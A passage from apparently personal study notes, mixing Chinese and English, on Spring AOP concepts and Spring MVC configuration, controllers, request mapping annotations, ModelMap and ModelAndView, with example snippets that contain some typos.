represents a point in your application where you can plug-in the AOP aspect. You can also say, it is the actual place in the application where an action will be taken using Spring AOP framework.</td></tr><tr><td align="center">3</td><td align="center"><strong>Advice</strong>   This is the actual action to be taken either before or after the method execution. This is an actual piece of code that is invoked during the program execution by Spring AOP framework.</td></tr><tr><td align="center">4</td><td align="center">*<em>Pointcut *</em> This is a set of one or more join points where an advice should be executed. You can specify pointcuts using expressions or patterns as we will see in our AOP examples.</td></tr><tr><td align="center">5</td><td align="center"><strong>Introduction</strong>  An introduction allows you to add new methods or attributes to the existing classes.</td></tr><tr><td align="center">6</td><td align="center">*<em>Target object *</em>The object being advised by one or more aspects. This object will always be a proxied object, also referred to as the advised object.</td></tr><tr><td align="center">7</td><td align="center">*<em>Weaving *</em> Weaving is the process of linking aspects with other application types or objects to create an advised object. This can be done at compile time, load time, or at runtime.</td></tr></tbody></table><p>types of Advice</p><p>Spring aspects can work with five kinds of advice mentioned as follows −</p><table><thead><tr><th align="center">Sr.No</th><th align="center">Advice &amp; Description</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><strong>before</strong>Run advice before the a method execution.</td></tr><tr><td align="center">2</td><td align="center"><strong>after</strong>Run advice after the method execution, regardless of its outcome.</td></tr><tr><td align="center">3</td><td align="center"><strong>after-returning</strong>Run advice after the a method execution only if method completes successfully.</td></tr><tr><td align="center">4</td><td align="center"><strong>after-throwing</strong>Run advice after the a method execution only if method exits by throwing an exception.</td></tr><tr><td align="center">5</td><td align="center"><strong>around</strong>Run advice before and after the advised method is invoked.</td></tr></tbody></table><p>自定义方面的实施</p><p>Spring支持@AspectJ 批注样式方法 和 基于模式的方法来实现自定义方面. 一下各节详细说明了两种方法</p><table><thead><tr><th></th><th>方法与描述</th></tr></thead><tbody><tr><td>1 基于XML模式</td><td>使用常规类以及基于XML的配置来实现切面</td></tr><tr><td>2 基于@AspectJ</td><td>@AspectJ是一种将切面声明为带有Java 5批注的常规Java类的样式</td></tr></tbody></table><h3 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h3><p>Spring Web MVC框架提供了Model-View-Controller(MVC)架构和线程的组件,可用于开发灵活且松散耦合的Web应用程序. MVC模式导致分离应用程序的不同方面(输入逻辑, 业务逻辑和UI逻辑) </p><ul><li>该<strong>模型</strong>封装了应用程序数据，通常它们将由POJO组成。</li><li>该<strong>视图</strong>负责呈现模型数据，并在总体上产生HTML输出，客户端的浏览器可以解释。</li><li>该<strong>控制器</strong>负责处理用户请求，并且建立一个合适的模型，并将其传递到用于渲染的图。</li></ul><h4 id="DispatcherServlet"><a href="#DispatcherServlet" class="headerlink" title="DispatcherServlet"></a>DispatcherServlet</h4><p>Spring Web模型视图控制器（MVC）框架是围绕处理所有HTTP请求和响应的<em>DispatcherServlet</em>设计的。下图说明了Spring Web MVC <em>DispatcherServlet</em>的请求处理工作流程-</p><p><img src="../images/java_web/spring_dispatcherservlet.png" alt="Spring DispatcherServlet"></p><p>以下是与<em>DispatcherServlet</em>的传入HTTP请求相对应的事件序列-</p><ul><li>收到HTTP请求后，<em>DispatcherServlet<em>咨询</em>HandlerMapping</em> 来调用适当的<em>Controller</em>。</li><li>该<em>控制器</em>接受请求，并调用基于所使用GET或POST方法相应的服务的方法。服务方法将基于定义的业务逻辑设置模型数据，并将视图名称返回给<em>DispatcherServlet</em>。</li><li>所述<em>的DispatcherServlet</em>将帮助从<em>的ViewResolver</em>到拾取该请求的已定义视图。</li><li>视图完成后，<em>DispatcherServlet</em>将模型数据传递到视图，该视图最终在浏览器上呈现。</li></ul><p>所需配置</p><p>您需要通过使用<strong>web.xml</strong>文件中的URL映射来映射希望<em>DispatcherServlet</em>处理的请求。以下是显示<strong>HelloWeb</strong> <em>DispatcherServlet</em>示例的声明和映射的示例-</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">id</span> = <span class="string">"WebApp_ID"</span> <span class="attr">version</span> = <span class="string">"2.4"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns</span> = <span class="string">"http://java.sun.com/xml/ns/j2ee"</span> </span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span> = <span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span> = <span class="string">"http://java.sun.com/xml/ns/j2ee </span></span></span><br><span class="line"><span class="tag"><span class="string">   http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">   <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Spring MVC Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloWeb<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">         org.springframework.web.servlet.DispatcherServlet</span><br><span class="line">      <span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloWeb<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在<strong>web.xml中</strong>的文件将被保存在你的Web应用程序的WebContent / WEB-INF目录下。初始化<strong>HelloWeb</strong> DispatcherServlet时，框架将尝试从位于应用程序WebContent / WEB-INF目录中名为<strong>[servlet-name] -servlet.xml</strong>的文件中加载应用程序上下文。在这种情况下，我们的文件将是<strong>HelloWebservlet.xml</strong>。</p><p>接下来，<servlet-mapping>标记指示哪个DispatcherServlet将处理哪些URL。在这里，所有以<strong>.jsp</strong>结尾的HTTP请求都将由<strong>HelloWeb</strong> DispatcherServlet处理。</p><p>如果不想使用默认文件名作为*[servlet-name] -servlet.xml<em>和默认位置作为</em>WebContent / WEB-INF<em>，则可以通过在web.xml文件中添加Servlet侦听器</em>ContextLoaderListener*来自定义此文件名和位置。如下-</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app...</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!-------- DispatcherServlet definition goes here-----&gt;</span></span><br><span class="line">   ....</span><br><span class="line">   <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/HelloWeb-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span></span><br><span class="line">         org.springframework.web.context.ContextLoaderListener</span><br><span class="line">      <span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>HelloWebservlet.xml必须配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span> = <span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:context</span> = <span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span> = <span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span> = <span class="string">"http://www.springframework.org/schema/beans     </span></span></span><br><span class="line"><span class="tag"><span class="string">   http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">   http://www.springframework.org/schema/context </span></span></span><br><span class="line"><span class="tag"><span class="string">   http://www.springframework.org/schema/context/spring-context-3.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span> = <span class="string">"location.package"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span> = <span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"prefix"</span> <span class="attr">value</span> = <span class="string">"/WEB-INF/jsp/"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"suffix"</span> <span class="attr">value</span> = <span class="string">".jsp"</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>The [servle-tname]-servlet.xml file will be used to create the beans defined, overriding the  definitions of any beans defined with the same name in the global scope</li><li>The *<a href="context:component-scan...">context:component-scan...</a>* tag will be use to activate Spring MVC annotation scanning capability which allows to make use of annotations like @Controller and @RequestMapping etc.</li><li>The <em>InternalResourceViewResolver</em> will have rules defined to resolve the view names. As per the above defined rule, a logical view named <strong>hello</strong> is delegated to a view implementation located at <em>/WEB-INF/jsp/hello.jsp</em> .</li></ul><p>定义解析视图名称规则, 根据上述定义的规则, 名为hello的逻辑视图被委派给/WEB-INF/jsp/hello.jsp</p><p>自定义.jsp 文件名称和内容, </p><h4 id="定义控制器"><a href="#定义控制器" class="headerlink" title="定义控制器"></a>定义控制器</h4><p>@Controller 注解 表明特定类供应控制器的作用 </p><p>在mvc配置文件中通过  <strong>&lt;context:component-scan /&gt;</strong> 扫描相应的类包，就可以使一个 POJO 类变成一个可以处理 HTTP 请求的控制器</p><p>可以创建数量不限的控制器用于处理不头同的业务请求</p><p>@RequestMapping 注解将用于将URl 映射到要么整个类或特定处理程序方法</p><p>所以可以根据需要将 @RequestMapping 调整到合适的位置</p><p>&lt;mvn:annotationDriven /&gt;  标签基本上是将你的Sprign上下文允许请求调度到控制器</p><p> essentially sets you your Spring context to allow for dispatching requests to Controller</p><h4 id="一些简单的用法and-基础"><a href="#一些简单的用法and-基础" class="headerlink" title="一些简单的用法and 基础"></a>一些简单的用法and 基础</h4><h5 id="接受json数据的四种方式"><a href="#接受json数据的四种方式" class="headerlink" title="接受json数据的四种方式"></a>接受json数据的四种方式</h5><p><strong>ReqeuestParam</strong> </p><p><img src="../images/java_web/image-20210501005141126.png" alt="image-20210501005141126"></p><p>@RequestParam </p><p><strong>实体类</strong> </p><p>@RequestBody 参数</p><p><img src="../images/java_web/image-20210501005224867.png" alt="image-20210501005224867"></p><p>json对象 </p><p><strong>map接收</strong></p><p>json对象<img src="../images/java_web/image-20210501005257833.png" alt="image-20210501005257833"></p><p><strong>List接收</strong></p><p><img src="../images/java_web/image-20210501005315987.png" alt="image-20210501005315987"></p><h5 id="Requesting-下方法的返回值"><a href="#Requesting-下方法的返回值" class="headerlink" title="@Requesting 下方法的返回值"></a>@Requesting 下方法的返回值</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/hello"</span> ,method = RequestMethod.GET)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">printHello</span><span class="params">(ModelMap model)</span></span>&#123;</span><br><span class="line">        model.addAttribute(<span class="string">"message"</span>,<span class="string">"Hello Spring MVC Framework !"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>retrun “hello”; 返回的为hello.jsp页面 </p><h5 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebController</span> </span>&#123;</span><br><span class="line">   <span class="meta">@RequestMapping</span>(value = <span class="string">"/index"</span>, method = RequestMethod.GET)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"index"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="meta">@RequestMapping</span>(value = <span class="string">"/redirect"</span>, method = RequestMethod.GET)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">redirect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"redirect:finalPage"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="meta">@RequestMapping</span>(value = <span class="string">"/finalPage"</span>, method = RequestMethod.GET)</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">finalPage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">"final"</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>将 重定向到 fianl.jsp </p><h5 id="静态页面"><a href="#静态页面" class="headerlink" title="静态页面"></a>静态页面</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mvc:resources</span> <span class="attr">mapping</span> = <span class="string">"/pages/**"</span> <span class="attr">location</span> = <span class="string">"/WEB-INF/pages/"</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><strong>&lt;mvc：resources …. /&gt;</strong>用于映射静态页面。的<strong>映射</strong>属性必须是一个Ant图案指定一个HTTP请求的URL模式。该<strong>位置</strong>属性必须指定为静态页面，包括images，stylesheets，JavaScript和其它静态内容的一个或多个有效的资源目录位置。可以使用逗号分隔的值列表来指定多个资源位置。</p><h5 id="RequestMapping"><a href="#RequestMapping" class="headerlink" title="@RequestMapping"></a>@RequestMapping</h5><ol><li><p>映射请求  处理URL请求, 注解可以标记在类上或方法上 </p></li><li><p>Dispatcher 截获请求后就通过@RequestMapping 提供的映射信息确定请求所对应的处理方法</p></li><li><p>@RequestMapping中可以指定value（请求URL）、method（请求的方法）、params（请求参数）、heads（请求头），他们之间时    与的关系，使用多个条件联合查询，可使请求精确化。</p></li><li><p>支持Ant风格的Url , Ant风格地址支持三种匹配符 ?  匹配文件名中的一个字符</p><p> 匹配文件名中的任意字符   * *: * * 匹配多层路径 </p></li><li><p>@Pathvariable 映射URL绑定的占位符</p><p>通过@PathVariable可以将URL中占位符参数绑定到控制器处理方法的入参中</p></li></ol><p>请求的URL为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"helloworld/1"</span>&gt;</span>To success<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>，可将“1”传入到方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/helloworld/&#123;id&#125;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(@PathVariable(<span class="string">"id"</span>)</span> Integer id)</span>&#123;</span><br><span class="line"> System.out.println(<span class="string">"helloWorld"</span>+id);</span><br><span class="line"> <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="映射请求参数、请求头"><a href="#映射请求参数、请求头" class="headerlink" title="映射请求参数、请求头"></a>映射请求参数、请求头</h6><ol><li><p>使用@RequestParam 可以把请求参数传递给请求方法 value : 参数名, required: 是否必须</p><p> 请求Url: <code>&lt;a href=&quot;helloworld?username=123&quot;&gt;To success &lt;/a&gt;</code></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/helloworld"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(@RequestParam(value=<span class="string">"username"</span> required=<span class="keyword">false</span>)</span>String un)</span>&#123;</span><br><span class="line">System.out.println(<span class="string">"helloworld :"</span>+ un);</span><br><span class="line">reuturn <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用 @RequestHeader绑定请求报头信息，请求头包含了若干属性，服务器可据此获知客户端的信息。</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/helloworld"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(@RequestHeader(<span class="string">"Accept-Encoding"</span>)</span> String encoding)</span>&#123;</span><br><span class="line">System.out.println(<span class="string">"helloWorld:"</span>+encoding);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使用@CookieValue绑定请求中的Cookie值</p></li></ol><pre><code><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/helloworld"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(@CookieValue(<span class="string">"JSESSIONID"</span>)</span> String sessionId)</span>&#123;</span><br><span class="line"> System.out.println(<span class="string">"helloWorld:"</span>+sessionId);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre><ol start="4"><li><p>使用POJO对象绑定请求参数, SpringMvc会按照请求参数名和POJO属性名自动进行配置, 自动为该对象填充属性,支持联属性<br> 1)表单, 此表单对应一个User 的JavaBean </p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"testPojo"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">       username:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       password:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       age:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"age"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"Submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p> 2) 处理方法, 结果在控制台输出user : User[username=adfd, password=585, age=13]</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/testPojo"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testPojo</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line">System.out.println(user);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>MVC的Handler 可以接受Servlet API</li></ol><p>HttpServletRequest, HttpServletResponse, HttpSession. java.serity.Principal , Locale , InpustSteam . OutputStream. Reader, Writer </p><h5 id="ModelMap"><a href="#ModelMap" class="headerlink" title="ModelMap"></a>ModelMap</h5><p>声明格式 </p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">ModelMap</span> <span class="keyword">extends</span> <span class="title">LinkedHashMap&lt;String</span>,<span class="title">Object&gt;</span></span></span><br></pre></td></tr></table></figure><p>ModelMap对象主要用于传递控制方法处理数据到结果页面, 也就是说我们把结果页面上需要的数据放到ModelMap对象中 即可, 他的作用类似于request对象的setArrtibute方法,用来在一个请求过程中处理数据 </p><p>通过 </p><p>addAttribute(String ley, Object value) ;</p><p>向页面传递参数    </p><p>在页面上可以通过el变量方式$key 或者bboss的一系列数据展示标签获取并展示modelmap中的数据 </p><h5 id="ModelAndView"><a href="#ModelAndView" class="headerlink" title="ModelAndView"></a>ModelAndView</h5><p>ModelAndView 可以作为返回值, 其包含 模型和数据信息, Springmvc 会将model 中的数据放到requests域 中 . </p><p>添加数据模型 : ModelAndView addObject(String attributeName , Object attributeValue)</p><p>​                           ModelAndView addAllObject（Map&lt;String,?&gt; modelMap） </p><p>设置视图:        void setView(View view)</p><p>​                         void setViewName(String ViewName)</p><p>example</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/testModelAndView"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">testModelAndView</span><span class="params">()</span></span>&#123;</span><br><span class="line">ModleAndView mv = <span class="keyword">new</span> ModelAndiew(<span class="string">"success"</span>);</span><br><span class="line">mv.addObject(<span class="string">"time"</span>,<span class="keyword">new</span> Date());</span><br><span class="line"><span class="keyword">return</span> mv;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在目标也success.jsp 接收time </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time:<span class="tag">&lt;<span class="name">%=request.getAttribute("time")</span> %&gt;</span></span><br></pre></td></tr></table></figure><p>MoudelAndView 对象有两个作用:</p><p>(1)设置转向地址, 着也是 ModelAndView 和 ModelMap 的主要区别 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ModelAndview view = <span class="keyword">new</span> ModelAndView(<span class="string">"path:ok"</span>)</span><br></pre></td></tr></table></figure><p>或者通过setViewName 的方法 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setViewName</span><span class="params">(String viewName)</span></span>&#123;.....&#125;</span><br></pre></td></tr></table></figure><p>(2). 将控制器方法中处理的结果数据传递到结果页面，也就是把在结果页面上需要的数据放到ModelAndView对象中即可，其作用类似于request对象的setAttribute方法的作用，用来在一个请求过程中传递处理的数据。通过以下方法向页面传递参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">addObject</span><span class="params">(String attributeName, Object attributeValue)</span></span>&#123;...&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">addObject</span><span class="params">(Object attributeValue)</span></span>&#123;...&#125;<span class="number">12</span></span><br></pre></td></tr></table></figure><p>在页面上也是可以通过el表达式语言$attributeName等系列数据展示标签获取并展示ModelAndView中的数据。</p><p>使用方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView  <span class="title">examehtod</span><span class="params">(String someparam)</span></span>&#123;</span><br><span class="line"><span class="comment">//构建ModelAndView 实例,并设置跳转地址</span></span><br><span class="line">ModelAndView view = <span class="keyword">new</span> ModelAndView(<span class="string">"path:handleok"</span>);</span><br><span class="line"><span class="comment">//将数据放置到ModelAndView对象view 中, 第二个参数可以是任何java类型</span></span><br><span class="line">view.addObejt(<span class="string">"可以"</span>,someparam);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回ModelAndView 对象View </span></span><br><span class="line"><span class="keyword">return</span> view;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h5><p>  Mode 是一个接口, 实现类为ExtendedMoudelMap , 继承了 ModelMap 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExtendedModelMap</span> <span class="title">extens</span> <span class="title">ModelMap</span> <span class="title">implments</span> <span class="title">Model</span></span></span><br></pre></td></tr></table></figure><h5 id="数据的转换-格式话-校验"><a href="#数据的转换-格式话-校验" class="headerlink" title="数据的转换 ,格式话, 校验"></a>数据的转换 ,格式话, 校验</h5><p>SpringMVC定义了3种类型的转换器接口:</p><ul><li>Conveet&lt;S,T&gt; 将S类型转换为T类型对象 </li><li>ConverterFactory : 将相同系列多个”通知” Conterver封装在一起 </li><li>GenericConverter: 会根据源类对象 及目标所在的宿主主类中的上下信息进行类型转换 </li></ul><h5 id="mvc-视图的流程图"><a href="#mvc-视图的流程图" class="headerlink" title="mvc 视图的流程图"></a>mvc 视图的流程图</h5><p><a 